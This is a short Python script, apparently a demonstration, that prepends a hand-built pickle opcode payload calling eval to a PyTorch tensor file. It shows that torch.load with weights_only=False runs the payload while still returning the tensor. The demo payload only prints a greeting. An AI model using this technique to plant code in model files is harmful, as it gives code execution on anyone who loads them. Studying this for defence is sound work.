import torch

# generate a harmless tensor and save it with torch.save
tensor = torch.tensor([1, 2, 3, 4, 5])
torch.save(tensor, 'good_pickle.pt', _use_new_zipfile_serialization=False)
with open('good_pickle.pt', 'rb') as f:
    good_pickle = f.read()
# prepend the payload and save it
pickled_bomb = b'c__builtin__\neval\n(Vprint("Hello from Gregor")\ntR0'
evil_pickle = pickled_bomb + good_pickle

with open("evil_pickle.pt","wb") as f:
    f.write(evil_pickle)
# let's load the evil pickle
result_tensor = torch.load("evil_pickle.pt", weights_only=False)
# result_tensor = torch.load("evil_pickle.pt", weights_only=True)
assert all(tensor == result_tensor)


import pickletools
print(pickletools.dis(evil_pickle))

# print("Good Torch Pickle")
# print(pickletools.dis(good_pickle))
#
#
# import pickle
# import pickletools
# pickle = pickle.dumps(("foo","bar",42),protocol=0)
# print(pickletools.dis(pickle))